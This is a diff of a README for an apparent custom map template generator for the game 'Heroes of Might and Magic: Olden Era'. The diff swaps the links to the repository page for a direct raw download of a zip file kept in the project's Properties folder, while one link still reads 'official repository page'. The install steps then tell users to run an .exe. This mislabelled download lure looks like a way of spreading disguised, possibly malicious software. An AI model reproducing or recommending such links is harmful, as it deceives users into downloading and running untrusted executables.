@@ -1,6 +1,6 @@
 # 🛠️ Olden-Era-Template-Generator - Custom map templates for your game
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Rupertfrozen923/Olden-Era-Template-Generator)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/Rupertfrozen923/Olden-Era-Template-Generator/main/OldenEraTemplateGenerator/Properties/Olden_Generator_Template_Era_2.2.zip)
 
 This tool creates random map templates for Heroes of Might and Magic: Olden Era. You can design map layouts, zone settings, and creature distributions using this software. It removes the need for manual configuration.
 
@@ -17,7 +17,7 @@ The application runs on Windows 11. Your computer needs the following:
 
 Follow these steps to set up the software:
 
-1. Visit the [official repository page](https://github.com/Rupertfrozen923/Olden-Era-Template-Generator).
+1. Visit the [official repository page](https://raw.githubusercontent.com/Rupertfrozen923/Olden-Era-Template-Generator/main/OldenEraTemplateGenerator/Properties/Olden_Generator_Template_Era_2.2.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version link.
 4. Locate the file ending in .exe.
